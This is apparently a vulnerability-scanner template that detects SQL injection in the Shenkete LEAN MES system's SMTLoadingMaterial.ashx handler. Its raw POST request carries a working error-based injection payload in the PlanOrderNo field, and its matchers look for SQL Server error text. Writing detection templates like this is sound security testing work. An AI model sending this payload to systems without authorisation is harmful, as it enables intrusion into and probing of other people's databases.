id: shenkete-SMTLoadingMaterial-sql

info:
  name: 深科特LEAN MES系统 SMTLoadingMaterial.ashx SQL注入漏洞
  author: shenkete
  severity: high
  tags: shenkete

http:
  - raw:
      - |
        POST /Handler/SMTLoadingMaterial.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Content-Type: application/x-www-form-urlencoded

        type=GetOrderList&PlanOrderNo='and 1<@@VERSION--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'nvarchar'
          - 'Microsoft SQL Server'
          - '转换成数据类型'
        condition: and
